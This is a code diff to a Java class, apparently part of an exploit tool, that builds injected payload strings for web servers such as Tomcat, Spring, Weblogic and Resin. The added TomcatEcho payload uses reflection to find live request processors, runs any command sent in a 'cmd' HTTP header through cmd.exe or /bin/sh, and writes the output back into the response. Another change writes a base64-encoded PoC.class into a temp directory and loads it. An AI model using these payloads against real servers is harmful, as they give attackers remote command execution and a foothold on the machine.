@@ -7,7 +7,7 @@ import sun.misc.BASE64Encoder;
 
 public class DirectiveProcessor{
     public static void main(String[] args) throws IOException {
-        System.out.println(process("directive:LinuxEcho"));
+        System.out.println(process("directive:AutoFindRequestEcho"));
     }
 
     public static String process(String command){
@@ -20,9 +20,7 @@ public class DirectiveProcessor{
 //            WindowsEcho("WindowsEcho"),
 //            SpringEcho1("SpringEcho1"),
 //            SpringEcho2("SpringEcho2"),
-//            Tomcat6Echo("Tomcat6Echo"),
-//            Tomcat7_8Echo("Tomcat7_8Echo"),
-//            Tomcat9Echo("Tomcat9Echo"),
+//            TomcatEcho("TomcatEcho"),
 //            WeblogicEcho1("WeblogicEcho1"),
 //            WeblogicEcho2("WeblogicEcho2"),
 //            ResinEcho("ResinEcho"),
@@ -42,12 +40,8 @@ public class DirectiveProcessor{
             return springEcho1();
         }else if(command.startsWith("directive:SpringEcho2")){
             return springEcho2();
-        }else if(command.startsWith("directive:Tomcat6Echo")){
-            return tomcat6Echo();
-        }else if(command.startsWith("directive:Tomcat7_8Echo")){
-            return tomcat7_8Echo();
-        }else if(command.startsWith("directive:Tomcat9Echo")){
-            return tomcat9Echo();
+        }else if(command.startsWith("directive:TomcatEcho")){
+            return tomcatEcho();
         }else if(command.startsWith("directive:WeblogicEcho1")){
             return weblogicEcho1();
         }else if(command.startsWith("directive:WeblogicEcho2")){
@@ -171,176 +165,87 @@ public class DirectiveProcessor{
         return code;
     }
 
-    public static String tomcat6Echo(){
-        String code = "    Object obj = Thread.currentThread();\n" +
-            "    java.lang.reflect.Field field = obj.getClass().getDeclaredField(\"target\");\n" +
-            "    field.setAccessible(true);\n" +
-            "    obj = field.get(obj);\n" +
+    public static String tomcatEcho(){
+        String code = "   boolean flag = false;\n" +
+            "    ThreadGroup group = Thread.currentThread().getThreadGroup();\n" +
+            "    java.lang.reflect.Field f = group.getClass().getDeclaredField(\"threads\");\n" +
+            "    f.setAccessible(true);\n" +
+            "    Thread[] threads = (Thread[]) f.get(group);\n" +
             "\n" +
-            "    field = obj.getClass().getDeclaredField(\"this$0\");\n" +
-            "    field.setAccessible(true);\n" +
-            "    obj = field.get(obj);\n" +
+            "    for(int i = 0; i < threads.length; i++) {\n" +
+            "        try{\n" +
+            "            Thread t = threads[i];\n" +
+            "            if (t == null) continue;\n" +
             "\n" +
-            "    field = obj.getClass().getDeclaredField(\"handler\");\n" +
-            "    field.setAccessible(true);\n" +
-            "    obj = field.get(obj);\n" +
-            "\n" +
-            "    field = obj.getClass().getDeclaredField(\"global\");\n" +
-            "    field.setAccessible(true);\n" +
-            "    obj = field.get(obj);\n" +
-            "\n" +
-            "    field = obj.getClass().getDeclaredField(\"processors\");\n" +
-            "    field.setAccessible(true);\n" +
-            "    obj = field.get(obj);\n" +
+            "            String str = t.getName();\n" +
+            "            if (str.contains(\"exec\") || !str.contains(\"http\")) continue;\n" +
             "\n" +
             "\n" +
-            "    java.util.List processors = (java.util.List) obj;\n" +
-            "    for(int i = 0; i < processors.size(); i++){\n" +
-            "        Object o = processors.get(i);\n" +
-            "        field = o.getClass().getDeclaredField(\"req\");\n" +
-            "        field.setAccessible(true);\n" +
-            "        obj = field.get(o);\n" +
+            "            f = t.getClass().getDeclaredField(\"target\");\n" +
+            "            f.setAccessible(true);\n" +
+            "            Object obj = f.get(t);\n" +
             "\n" +
-            "        java.lang.reflect.Method method = Class.forName(\"org.apache.coyote.Request\").getMethod(\"getHeader\", new Class[]{String.class});\n" +
-            "        String cmd = (String) method.invoke(obj, new Object[]{\"cmd\"});\n" +
-            "        if (cmd != null) {\n" +
-            "            String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
+            "            if (!(obj instanceof Runnable)) continue;\n" +
             "\n" +
-            "            org.apache.tomcat.util.buf.ByteChunk bc = new org.apache.tomcat.util.buf.ByteChunk();\n" +
-            "            bc.setBytes(res.getBytes(), 0, res.getBytes().length);\n" +
+            "            f = obj.getClass().getDeclaredField(\"this$0\");\n" +
+            "            f.setAccessible(true);\n" +
+            "            obj = f.get(obj);\n" +
             "\n" +
-            "            method = obj.getClass().getMethod(\"getResponse\", null);\n" +
-            "            obj = method.invoke(obj, null);\n" +
-            "            method = obj.getClass().getMethod(\"doWrite\", new Class[]{Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\")});\n" +
-            "            method.invoke(obj, new Object[]{bc});\n" +
+            "            try{\n" +
+            "                f = obj.getClass().getDeclaredField(\"handler\");\n" +
+            "            }catch (NoSuchFieldException e){\n" +
+            "                f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\"handler\");\n" +
+            "            }\n" +
+            "            f.setAccessible(true);\n" +
+            "            obj = f.get(obj);\n" +
+            "\n" +
+            "            try{\n" +
+            "                f = obj.getClass().getSuperclass().getDeclaredField(\"global\");\n" +
+            "            }catch(NoSuchFieldException e){\n" +
+            "                f = obj.getClass().getDeclaredField(\"global\");\n" +
+            "            }\n" +
+            "            f.setAccessible(true);\n" +
+            "            obj = f.get(obj);\n" +
+            "\n" +
+            "            f = obj.getClass().getDeclaredField(\"processors\");\n" +
+            "            f.setAccessible(true);\n" +
+            "            java.util.List processors = (java.util.List)(f.get(obj));\n" +
+            "\n" +
+            "            for(int j = 0; j < processors.size(); ++j) {\n" +
+            "                Object processor = processors.get(j);\n" +
+            "                f = processor.getClass().getDeclaredField(\"req\");\n" +
+            "                f.setAccessible(true);\n" +
+            "                Object req = f.get(processor);\n" +
+            "                Object resp = req.getClass().getMethod(\"getResponse\", new Class[0]).invoke(req, new Object[0]);\n" +
+            "\n" +
+            "                str = (String)req.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(req, new Object[]{\"cmd\"});\n" +
+            "\n" +
+            "                if (str != null && !str.isEmpty()) {\n" +
+            "                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});\n" +
+            "                    String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", str} : new String[]{\"/bin/sh\", \"-c\", str};\n" +
+            "                    byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes();\n" +
+            "\n" +
+            "                    try {\n" +
+            "                        Class cls = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
+            "                        obj = cls.newInstance();\n" +
+            "                        cls.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});\n" +
+            "                        resp.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(resp, new Object[]{obj});\n" +
+            "                    } catch (NoSuchMethodException var5) {\n" +
+            "                        Class cls = Class.forName(\"java.nio.ByteBuffer\");\n" +
+            "                        obj = cls.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(cls, new Object[]{result});\n" +
+            "                        resp.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(resp, new Object[]{obj});\n" +
+            "                    }\n" +
+            "\n" +
+            "                    flag = true;\n" +
+            "                }\n" +
+            "\n" +
+            "                if (flag) break;\n" +
+            "            }\n" +
+            "\n" +
+            "            if (flag)  break;\n" +
+            "        }catch(Exception e){\n" +
+            "            continue;\n" +
             "        }\n" +
-            "    }";
-
-        return code;
-    }
-
-    public static String tomcat7_8Echo(){
-        String code = "Object obj = Thread.currentThread();\n" +
-            "    java.lang.reflect.Field field = obj.getClass().getSuperclass().getDeclaredField(\"group\");\n" +
-            "    field.setAccessible(true);\n" +
-            "    obj = field.get(obj);\n" +
-            "\n" +
-            "    field = obj.getClass().getDeclaredField(\"threads\");\n" +
-            "    field.setAccessible(true);\n" +
-            "    obj = field.get(obj);\n" +
-            "\n" +
-            "    Thread[] threads = (Thread[])obj;\n" +
-            "    for(int i=0; i < threads.length; i++){\n" +
-            "        try{\n" +
-            "            Thread t = threads[i];\n" +
-            "            if((t.getName().contains(\"http-apr\") && t.getName().contains(\"Poller\"))\n" +
-            "                    || (t.getName().contains(\"http-bio\") && t.getName().contains(\"AsyncTimeout\"))\n" +
-            "                    || (t.getName().contains(\"http-nio\") && t.getName().contains(\"Poller\"))) {\n" +
-            "                field = t.getClass().getDeclaredField(\"target\");\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(t);\n" +
-            "\n" +
-            "                field = obj.getClass().getDeclaredField(\"this$0\");\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(obj);\n" +
-            "\n" +
-            "                try{\n" +
-            "                    field = obj.getClass().getDeclaredField(\"handler\");\n" +
-            "                }catch (NoSuchFieldException e){\n" +
-            "                    field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\"handler\");\n" +
-            "                }\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(obj);\n" +
-            "\n" +
-            "                try{\n" +
-            "                    field = obj.getClass().getSuperclass().getDeclaredField(\"global\");\n" +
-            "                }catch(NoSuchFieldException e){\n" +
-            "                    field = obj.getClass().getDeclaredField(\"global\");\n" +
-            "                }\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(obj);\n" +
-            "\n" +
-            "                field = obj.getClass().getDeclaredField(\"processors\");\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(obj);\n" +
-            "\n" +
-            "                java.util.List processors = (java.util.List) obj;\n" +
-            "                for (int j = 0; j < processors.size(); j++) {\n" +
-            "                    Object o = processors.get(j);\n" +
-            "                    field = o.getClass().getDeclaredField(\"req\");\n" +
-            "                    field.setAccessible(true);\n" +
-            "                    obj = field.get(o);\n" +
-            "\n" +
-            "                    java.lang.reflect.Method method = Class.forName(\"org.apache.coyote.Request\").getMethod(\"getHeader\", new Class[]{String.class});\n" +
-            "                    String cmd = (String) method.invoke(obj, new Object[]{\"cmd\"});\n" +
-            "                    if (cmd != null) {\n" +
-            "                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
-            "\n" +
-            "                        org.apache.tomcat.util.buf.ByteChunk bc = new org.apache.tomcat.util.buf.ByteChunk();\n" +
-            "                        bc.setBytes(res.getBytes(), 0, res.getBytes().length);\n" +
-            "\n" +
-            "                        method = obj.getClass().getMethod(\"getResponse\", null);\n" +
-            "                        obj = method.invoke(obj, null);\n" +
-            "                        method = obj.getClass().getMethod(\"doWrite\", new Class[]{Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\")});\n" +
-            "                        method.invoke(obj, new Object[]{bc});\n" +
-            "                        return;\n" +
-            "                    }\n" +
-            "                }\n" +
-            "            }\n" +
-            "        }catch(Exception e){}\n" +
-            "    }";
-
-        return code;
-    }
-
-    public static String tomcat9Echo(){
-        String code = "    Object obj = Thread.currentThread();\n" +
-            "    java.lang.reflect.Field field = obj.getClass().getSuperclass().getDeclaredField(\"group\");\n" +
-            "    field.setAccessible(true);\n" +
-            "    obj = field.get(obj);\n" +
-            "    field = obj.getClass().getDeclaredField(\"threads\");\n" +
-            "    field.setAccessible(true);\n" +
-            "    obj = field.get(obj);\n" +
-            "    Thread[] threads = (Thread[])obj;\n" +
-            "    for(int i = 0; i < threads.length; i++){\n" +
-            "        try{\n" +
-            "            Thread t = threads[i];\n" +
-            "            if(t.getName().contains(\"http-nio\") && t.getName().contains(\"ClientPoller\")) {\n" +
-            "                field = t.getClass().getDeclaredField(\"target\");\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(t);\n" +
-            "                field = obj.getClass().getDeclaredField(\"this$0\");\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(obj);\n" +
-            "                field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\"handler\");\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(obj);\n" +
-            "                field = obj.getClass().getDeclaredField(\"global\");\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(obj);\n" +
-            "                field = obj.getClass().getDeclaredField(\"processors\");\n" +
-            "                field.setAccessible(true);\n" +
-            "                obj = field.get(obj);\n" +
-            "                java.util.List processors = (java.util.List) obj;\n" +
-            "                for (int j = 0; j < processors.size(); j++) {\n" +
-            "                    Object o = processors.get(j);\n" +
-            "                    field = o.getClass().getDeclaredField(\"req\");\n" +
-            "                    field.setAccessible(true);\n" +
-            "                    obj = field.get(o);\n" +
-            "                    java.lang.reflect.Method method = Class.forName(\"org.apache.coyote.Request\").getMethod(\"getHeader\", new Class[]{String.class});\n" +
-            "                    String cmd = (String) method.invoke(obj, new Object[]{\"cmd\"});\n" +
-            "                    if (cmd != null) {\n" +
-            "                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
-            "                        java.nio.ByteBuffer buffer = java.nio.ByteBuffer.wrap(res.getBytes());\n" +
-            "                        method = obj.getClass().getMethod(\"getResponse\", null);\n" +
-            "                        obj = method.invoke(obj, null);\n" +
-            "                        method = obj.getClass().getMethod(\"doWrite\", new Class[]{Class.forName(\"java.nio.ByteBuffer\")});\n" +
-            "                        method.invoke(obj, new Object[]{buffer});\n" +
-            "                        return;\n" +
-            "                    }\n" +
-            "                }\n" +
-            "            }\n" +
-            "        }catch(Exception e){}\n" +
             "    }";
 
         return code;
@@ -577,8 +482,14 @@ public class DirectiveProcessor{
     }
 
     public static String autoFindRequestEcho(){
-        String code = "    Class clazz = Class.forName(\"PoC\");\n" +
-            "    clazz.newInstance();";
+        String code = "    java.net.URL url;\n" +
+            "    if (java.io.File.separator.equals(\"/\")) {\n" +
+            "        url = new java.net.URL(\"file:///tmp/\");\n" +
+            "    }else{\n" +
+            "        url = new java.net.URL(\"file:///c:/windows/temp/\");\n" +
+            "    }\n" +
+            "    java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[]{url}, Thread.currentThread().getContextClassLoader());\n" +
+            "    urlClassLoader.loadClass(\"PoC\").newInstance();";
 
         return code;
     }
@@ -602,18 +513,23 @@ public class DirectiveProcessor{
         String part = encoder.encode(temp).replaceAll("\r|\n|\r\n", "");
 
 
-        String code = "String p = Thread.currentThread().getContextClassLoader().getResource(\"\").getPath();\n" +
-            "            p = java.net.URLDecoder.decode(p,\"utf-8\");\n" +
-            "            java.io.OutputStream os = new java.io.FileOutputStream(p + \"PoC.class\"," + (i != 0) + ");\n" +
-            "            sun.misc.BASE64Decoder d = new sun.misc.BASE64Decoder();\n" +
-            "            java.io.InputStream in = new java.io.ByteArrayInputStream(d.decodeBuffer(\"" + part + "\"));\n" +
-            "            byte[] f = new byte[1024];\n" +
-            "            int l = 0;\n" +
-            "            while((l=in.read(f))!=-1){\n" +
-            "                os.write(f, 0, l);\n" +
-            "            }\n" +
-            "            in.close();\n" +
-            "            os.close();";
+
+        String code = "String path;\n" +
+            "        if (java.io.File.separator.equals(\"/\")) {\n" +
+            "            path = \"/tmp/PoC.class\";\n" +
+            "        }else{\n" +
+            "            path = \"c:/windows/temp/PoC.class\";\n" +
+            "        }\n" +
+            "        java.io.OutputStream os = new java.io.FileOutputStream(path," + (i != 0) + ");\n" +
+            "        sun.misc.BASE64Decoder d = new sun.misc.BASE64Decoder();\n" +
+            "        java.io.InputStream in = new java.io.ByteArrayInputStream(d.decodeBuffer(\"" + part + "\"));\n" +
+            "        byte[] f = new byte[1024];\n" +
+            "        int l = 0;\n" +
+            "        while((l=in.read(f))!=-1){\n" +
+            "            os.write(f, 0, l);\n" +
+            "        }\n" +
+            "        in.close();\n" +
+            "        os.close();";
 
         return code;
     }
